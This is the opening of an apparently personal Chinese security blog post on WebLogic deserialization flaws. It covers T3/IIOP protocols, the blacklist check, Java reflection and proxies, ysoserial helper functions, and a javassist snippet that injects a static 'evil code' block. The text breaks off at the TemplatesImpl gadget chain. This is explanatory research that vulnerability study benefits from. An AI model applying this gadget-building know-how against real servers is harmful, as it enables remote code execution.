<!DOCTYPE html><html lang="zh-Hans" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>WebLogic反序列化漏洞研究 | Tyaoo's Blog</title><meta name="keywords" content="WebLogic"><meta name="author" content="Tyaoo"><meta name="copyright" content="Tyaoo"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="搜集和分析关于WebLogic的反序列化漏洞">
<meta property="og:type" content="article">
<meta property="og:title" content="WebLogic反序列化漏洞研究">
<meta property="og:url" content="https://tyaoo.github.io/2021/02/02/WebLogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/index.html">
<meta property="og:site_name" content="Tyaoo&#39;s Blog">
<meta property="og:description" content="搜集和分析关于WebLogic的反序列化漏洞">
<meta property="og:locale">
<meta property="article:published_time" content="2021-02-02T14:33:50.000Z">
<meta property="article:modified_time" content="2022-02-15T09:36:16.000Z">
<meta property="article:author" content="Tyaoo">
<meta property="article:tag" content="WebLogic">
<meta name="twitter:card" content="summary"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://tyaoo.github.io/2021/02/02/WebLogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'WebLogic反序列化漏洞研究',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-02-15 17:36:16'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Tyaoo's Blog" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">36</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">11</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Tyaoo's Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">WebLogic反序列化漏洞研究</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2021-02-02T14:33:50.000Z" title="Created 2021-02-02 22:33:50">2021-02-02</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2022-02-15T09:36:16.000Z" title="Updated 2022-02-15 17:36:16">2022-02-15</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="WebLogic反序列化漏洞研究"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
<p>搜集和分析关于WebLogic的反序列化漏洞</p>
</blockquote>
<span id="more"></span>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><strong>序列化数据特征</strong></p>
<p>对weblogic在7001端口的T3协议进行抓包，可以发现java序列化之后数据的Magic头<code>ac ed 00 05</code>，其编码后是<code>rO0ABQ==</code></p>
<p><strong>使用场景</strong></p>
<ol>
<li>http参数，cookie，sesion，存储方式可能是base64（rO0），压缩后的base64（H4sl），MII等</li>
<li>ServletsHTTP，Sockets，Session管理器包含的协议，包括JMX，RMI，JMS，JNDI等</li>
<li>xmlXstream，XMLDecoder等</li>
<li>json，包括Jackson，fastjson等</li>
</ol>
<p><strong>反序列化攻击时序图</strong></p>
<p>Java应用的反序列化流程</p>
<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105221529bd01a07b7dcb57cfbb91.png" alt="image-20210522152846833" style="zoom: 67%;" />

<p><strong>反序列化流程图</strong></p>
<p>WebLogic进行反序列化的执行流程图</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210127195915def76095470f1ec5fe.png" alt="img"></p>
<blockquote>
<p>实现了<code>External</code>接口的对象会调用<code>readExternal()</code>函数，实现了<code>Serialize</code>接口的对象会调用<code>readObject()</code>函数</p>
<p>使用<code>Proxy</code>类封装的对象会调用<code>readProxyClass()</code>函数，否则会调用<code>readClass()</code>函数</p>
<p>如果对象中存在<code>readResolve()</code>函数会自动执行它</p>
<p>weblogic的黑名单检查放置在<code>resolveProxyClass()</code>和<code>resolveClass()</code>函数中，函数为<code>ClassFilter.isBlackListed()</code></p>
</blockquote>
<p><strong>漏洞分类</strong></p>
<p>WebLogic反序列化高危漏洞主要分为java反序列化和xml反序列化，其中java发序列化可通过T3协议和IIOP协议触发，下面的漏洞分析也是根据这两大方面分隔展示</p>
<h2 id="相关协议"><a href="#相关协议" class="headerlink" title="相关协议"></a>相关协议</h2><p><strong>反射机制</strong></p>
<p>JAVA反射机制是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意一个方法和属性；这种动态获取的信息以及动态调用对象的方法的功能称为java语言的反射机制。</p>
<p><strong>RMI和JRMP协议</strong></p>
<p>RMI是Remote Method Invocation的简称，是J2SE的一部分，能够让程序员开发出基于Java的分布式应用。一个RMI对象是一个远程Java对象，可以从另一个Java虚拟机上（甚至跨过网络）调用它的方法，可以像调用本地Java对象的方法一样调用远程对象的方法，使分布在不同的JVM中的对象的外表和行为都像本地对象一样，RMI传输过程都使用序列化和反序列化。RMI目前使用Java远程消息交换协议JRMP（Java Remote Messaging Protocol）进行通信。JRMP协议是专为Java的远程对象制定的协议。</p>
<p><strong>CORBA</strong></p>
<p>CORBA（Common Object Request Broker Architecture，公共对象请求代理体系结构）是跨语言（C ++、Java等）的通信体系结构，通常在 IIOP 协议中使用。</p>
<p><strong>GIOP协议</strong></p>
<p>GIOP（General Inter-ORB Protocol，通用对象请求代理间通信协议）是分布式计算领域的一种抽象协议，负责ORB的通信。</p>
<p><strong>IIOP协议</strong></p>
<p>IIOP（Internet Inter-ORB Protocol，互联网内部对象请求代理协议），用来在CORBA对象请求代理之间交流的协议，实现Java和其他语言的CORBA的互操作。</p>
<p><strong>RMI-IIOP协议</strong></p>
<p>兼容了RMI和IIOP的实现，解决RMI和CORBA&#x2F;IIOP无法同时使用的技术方案。</p>
<p><strong>T3协议</strong></p>
<p>WebLogic Server 中的 RMI 通信使用 T3 协议在WebLogic Server和其他 Java程序（包括客户端及其他 WebLogic Server 实例）间传输数据（序列化的类）。由于WebLogic的T3协议和Web协议共用同一个端口，因此只要能访问WebLogic就可利用T3协议实现payload和目标服务器的通信。</p>
<p><strong>IDL</strong></p>
<p>IDL（Interface Definition Language，接口定义语言）主要用于描述软件组件的应用程序编程接口的一种规范语言。它完成了与各种编程语言无关的方式描述接口，从而实现了不同语言之间的通信，这样就保证了跨语言跨环境的远程对象调用。</p>
<p><strong>JAVA IDL</strong></p>
<p>JAVA IDL是一个分布的对象技术，允许其对象在不同的语言间进行交互。它的实现是基于CORBA，一个行业标准的分布式对象模型。每个语言支持CORBA都有他们自己的IDL Mapping映射关系，IDL和JAVA的映射关系可以参考<a target="_blank" rel="noopener" href="https://docs.oracle.com/javase/8/docs/technotes/guides/idl/mapping/jidlMapping.html">文档</a>。</p>
<h2 id="反射机制"><a href="#反射机制" class="headerlink" title="反射机制"></a>反射机制</h2><p>在Java中的反射机制是指在运行状态中，对于任意一个类都能够知道这个类所有的属性和方法，并且对于任意一个对象，都能够调用它的任意一个方法，这种动态获取信息以及动态调用对象方法的功能成为Java语言的反射机制</p>
<p><strong>获取class</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 函数调用</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">class1</span> <span class="operator">=</span> testClass.getClass();</span><br><span class="line"><span class="comment">// class属性,最安全,性能最好,不会自动初始化该Class对象</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">class2</span> <span class="operator">=</span> testClass.class;</span><br><span class="line"><span class="comment">// 动态加载,最常用,className需要是类的全限定名,会自动初始化该Class对象</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">class3</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;&#123;package.className&#125;&quot;</span>);</span><br><span class="line"><span class="comment">// 动态加载</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">class4</span> <span class="operator">=</span> ClassLoader.loadClass(<span class="string">&quot;&#123;package.className&#125;&quot;</span>);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>反射调用内部类的时候需要使用<code>$</code>来代替<code>.</code>，如<code>com.org.test</code>类有一个叫做<code>Hello</code>的内部类，则在调用它的时候要写成：<code>com.org.test$Hello</code></p>
</blockquote>
<p><strong>获取constructor</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// getDeclaredConstructor会返回所有有权限的构造器</span></span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor1</span> <span class="operator">=</span> class1.getDeclaredConstructor(&#123;arg1&#125;.class, ...);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructors1</span> <span class="operator">=</span> class1.getDeclaredConstructors(&#123;arg1&#125;.class, ...);</span><br><span class="line"><span class="comment">// getConstructor只返回权限是public的构造器</span></span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor2</span> <span class="operator">=</span> class1.getConstructor(&#123;arg1&#125;.class, ...);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructors2</span> <span class="operator">=</span> class1.getConstructors(&#123;arg1&#125;.class, ...);</span><br></pre></td></tr></table></figure>

<p><strong>创建instance</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用构造器进行实例化</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">instance1</span> <span class="operator">=</span> constructor1.newInstance();</span><br><span class="line"><span class="comment">// 当构造函数无参时,可直接使用class进行实例化</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">instance1</span> <span class="operator">=</span> class1.newInstance();</span><br></pre></td></tr></table></figure>

<p><strong>获取method</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// getDeclaredMethod会返回到当前类的所有成员方法</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">method1</span> <span class="operator">=</span> class1.getDeclaredMethod(<span class="string">&quot;&#123;methodName&#125;&quot;</span>, &#123;arg1&#125;.class, ...);</span><br><span class="line">Method[] methods1 = class1.getDeclaredMethods();</span><br><span class="line"><span class="comment">// getMethod只返回当前类和父类的权限是public的方法</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">method2</span> <span class="operator">=</span> class1.getMethod(<span class="string">&quot;&#123;methodName&#125;&quot;</span>, &#123;arg1&#125;.class, ...);</span><br><span class="line">Method[] methods2 = class1.getMethods();</span><br></pre></td></tr></table></figure>

<p><strong>调用method</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Process</span> <span class="variable">process1</span> <span class="operator">=</span> (Process) method1.invoke(instance1,<span class="string">&quot;&#123;arg0&#125;&quot;</span>); <span class="comment">// arg0是调用函数的参数,可选选项</span></span><br></pre></td></tr></table></figure>

<p><strong>获取method结果</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> process1.getInputStream();</span><br></pre></td></tr></table></figure>

<p><strong>输出method结果</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(IOUtils.toString(in,<span class="string">&quot;UTF-8&quot;</span>));</span><br></pre></td></tr></table></figure>

<p><strong>设置public属性</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">constructor1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">method1.setAccessible(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure>



<h2 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h2><p>Java动态机制涉及一个接口和一个类，分别是<code>InvocationHandler</code>接口和<code>Proxy</code>类</p>
<p><strong>InvocationHandler</strong></p>
<p><code>InvocationHandler</code>接口是<code>proxy</code>代理实例的调用处理程序实现的一个接口，每一个proxy代理实例都有一个关联的调用处理程序，在代理实例调用方法时，方法调用被编码并调度到调用处理程序的<code>invoke</code>方法</p>
<p><strong>Proxy</strong></p>
<p><code>Proxy</code>类就是用来创建一个代理对象的类，它提供了很多方法，但是我们最常用的是<code>newProxyInstance</code>方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">newProxyInstance</span><span class="params">(</span></span><br><span class="line"><span class="params">    ClassLoader loader,  // 代理类的classloader</span></span><br><span class="line"><span class="params">	Class&lt;?&gt;[] interfaces,  // 代理类的interface数组</span></span><br><span class="line"><span class="params">	InvocationHandler h // 包含invoke函数实现的InvocationHandler</span></span><br><span class="line"><span class="params">)</span></span><br></pre></td></tr></table></figure>

<p><strong>样例</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Hello</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">morning</span><span class="params">(String name)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvocationHandler</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                System.out.println(method);</span><br><span class="line">                <span class="keyword">if</span> (method.getName().equals(<span class="string">&quot;morning&quot;</span>)) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;Good morning, &quot;</span> + args[<span class="number">0</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Hello</span> <span class="variable">hello</span> <span class="operator">=</span> (Hello) Proxy.newProxyInstance(</span><br><span class="line">            Hello.class.getClassLoader(), <span class="comment">// 传入ClassLoader</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Hello.class &#125;, <span class="comment">// 传入要实现的接口</span></span><br><span class="line">            handler); <span class="comment">// 传入处理调用方法的InvocationHandler</span></span><br><span class="line">        hello.morning(<span class="string">&quot;Bob&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="ysoserial"><a href="#ysoserial" class="headerlink" title="ysoserial"></a>ysoserial</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p>
</blockquote>
<p>ysoerial是一款专门用于生成Java反序列化Payload的工具</p>
<p>我们可以在<code>src/main/java/ysoserial/payloads/</code>文件夹中自定义自己的Payload，不过在自定义之前我们需要了解<code>src/main/java/ysoserial/payloads/util</code>文件中工具类的使用</p>
<p><strong>ClassFiles.java</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将类转化为文件名</span></span><br><span class="line">String <span class="title function_">classAsFile</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="type">boolean</span> suffix)</span></span><br><span class="line"><span class="comment">// 将类转化为字节码</span></span><br><span class="line"><span class="type">byte</span>[] classAsBytes(<span class="keyword">final</span> Class&lt;?&gt; clazz)</span><br></pre></td></tr></table></figure>

<p><strong>Gadgets.java</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建一个memberValues为map的AnnotationInvocationHandler接口</span></span><br><span class="line">InvocationHandler <span class="title function_">createMemoizedInvocationHandler</span> <span class="params">( <span class="keyword">final</span> Map&lt;String, Object&gt; map )</span></span><br><span class="line"><span class="comment">// 创建iface类对应的Proxy实例</span></span><br><span class="line">&lt;T&gt; T <span class="title function_">createProxy</span> <span class="params">( <span class="keyword">final</span> InvocationHandler ih, <span class="keyword">final</span> Class&lt;T&gt; iface, <span class="keyword">final</span> Class&lt;?&gt;... ifaces )</span></span><br><span class="line"><span class="comment">// 创建实现了AnnotationInvocationHandler接口的iface类对应的Proxy实例</span></span><br><span class="line">&lt;T&gt; T <span class="title function_">createMemoitizedProxy</span> <span class="params">( <span class="keyword">final</span> Map&lt;String, Object&gt; map, <span class="keyword">final</span> Class&lt;T&gt; iface, <span class="keyword">final</span> Class&lt;?&gt;... ifaces )</span></span><br><span class="line"><span class="comment">// 创建一个HashMap实例并加入&#123;key:val&#125;元素</span></span><br><span class="line">Map&lt;String, Object&gt; <span class="title function_">createMap</span> <span class="params">( <span class="keyword">final</span> String key, <span class="keyword">final</span> Object val )</span></span><br><span class="line"><span class="comment">// 使用TemplatesImpl的Gadget构造执行command的对象</span></span><br><span class="line">Object <span class="title function_">createTemplatesImpl</span> <span class="params">( <span class="keyword">final</span> String command )</span></span><br><span class="line"><span class="comment">// 创建一个table成员为[&#123;v1:v1&#125;,&#123;v2:v2&#125;]的HashMap实例</span></span><br><span class="line">HashMap <span class="title function_">makeMap</span> <span class="params">( Object v1, Object v2 )</span></span><br></pre></td></tr></table></figure>

<p><strong>JavaVersion.java</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取本地Java版本</span></span><br><span class="line">JavaVersion <span class="title function_">getLocalVersion</span><span class="params">()</span></span><br></pre></td></tr></table></figure>

<p><strong>PayloadRunner.java</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 运行Payload</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">run</span><span class="params">(<span class="keyword">final</span> Class&lt;? extends ObjectPayload&lt;?&gt;&gt; clazz, <span class="keyword">final</span> String[] args)</span></span><br></pre></td></tr></table></figure>

<p><strong>Reflections.java</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取对象成员</span></span><br><span class="line">Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span></span><br><span class="line"><span class="comment">// 设置对象成员</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span></span><br><span class="line"><span class="comment">// 获取对象成员的值</span></span><br><span class="line">Object <span class="title function_">getFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName)</span></span><br><span class="line"><span class="comment">// 获取第一个构造器</span></span><br><span class="line">Constructor&lt;?&gt; getFirstCtor(<span class="keyword">final</span> String name)</span><br><span class="line"><span class="comment">// 使用构造器进行实例化</span></span><br><span class="line">&lt;T&gt; T <span class="title function_">createWithConstructor</span> <span class="params">( Class&lt;T&gt; classToInstantiate, Class&lt;? <span class="built_in">super</span> T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes, Object[] consArgs )</span></span><br></pre></td></tr></table></figure>



<h2 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://b1ngz.github.io/java-deserialization-jdk7u21-gadget-note/">https://b1ngz.github.io/java-deserialization-jdk7u21-gadget-note/</a></p>
</blockquote>
<p>在上面<code>Gadgets.java</code>中的<code>createTemplatesImpl()</code>函数中，我们提到了ysoserial是使用<code>TemplatesImpl</code>的Gadget来构造恶意数据的，下面我们详细介绍一下其原理</p>
<h3 id="javassist"><a href="#javassist" class="headerlink" title="javassist"></a>javassist</h3><p>Java字节码操作库，提供了在运行时操作Java字节码的方法，如在已有Class中动态修改和插入Java static代码</p>
<p><strong>样例</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Cat</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">  <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">  <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.get(Cat.class.getName());</span><br><span class="line">  <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;System.out.println(\&quot;evil code\&quot;);&quot;</span>;</span><br><span class="line">  <span class="comment">// 创建static代码块，并插入代码</span></span><br><span class="line">  cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">  <span class="type">String</span> <span class="variable">randomClassName</span> <span class="operator">=</span> <span class="string">&quot;EvilCat&quot;</span> + System.nanoTime();</span><br><span class="line">  cc.setName(randomClassName);</span><br><span class="line">  <span class="comment">// 写入.class 文件</span></span><br><span class="line">  cc.writeFile();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这里有一个重要的知识点是<code>defineClass()</code>函数并不会触发上面的static代码，但是使用<code>newInstence()</code>函数进行实例化的时候可以触发</p>
</blockquote>
<h3 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h3><p>首先我们找到<code>TemplatesImpl</code>类的入口点<code>getOutputProperties()</code>函数</p>
